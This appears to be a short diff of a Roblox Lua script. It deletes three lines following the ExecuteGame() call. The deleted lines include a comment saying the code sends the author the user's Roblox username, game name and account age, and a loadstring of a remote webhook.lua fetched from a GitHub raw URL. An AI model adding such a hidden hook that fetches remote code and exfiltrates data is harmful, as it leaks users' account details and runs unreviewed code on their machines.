@@ -33,6 +33,3 @@ local function ExecuteGame()
 end
 
 ExecuteGame()
-wait(0.5)
--- yes this sends me the Roblox Username, Game Name and Account Age
-loadstring(game:HttpGet("https://raw.githubusercontent.com/blackowl1231/ZYPHERION/refs/heads/main/webhook.lua"))()
